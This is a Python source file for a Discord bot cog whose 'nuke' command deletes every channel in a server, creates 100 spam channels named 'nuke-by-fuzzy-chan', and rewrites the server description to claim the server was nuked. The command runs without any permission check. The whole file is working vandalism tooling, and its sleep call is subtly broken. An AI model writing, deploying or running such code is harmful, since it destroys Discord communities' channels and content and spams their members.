import discord
from discord.ext import commands
import asyncio

class Nuke(commands.Cog):
    def __init__ (self, bot):
        self.bot = bot
        self.text_channels = []

    @commands.command()
    async def nuke(self, ctx):
        Guild = ctx.guild
        if not Guild:
            return False
        
        delete_all = [channel.delete(reason='nuke by fuzzy-chan') for channel in Guild.channels]
        await asyncio.gather(* delete_all)
        
        number = 0
        while number < 100: 
            await asyncio.sleep(0,75)
            await Guild.create_text_channel('nuke-by-fuzzy-chan', reason='nuke by fuzzy chan')
            number += 1

        await Guild.edit(
            reason = 'Nuke by Fuzzy-chan',
            description = 'Server bị nuke bởi Fuzzy-chan',
            community = False
            )
        print('>>> SPAM.....')




async def setup(bot):
    await bot.add_cog(Nuke(bot))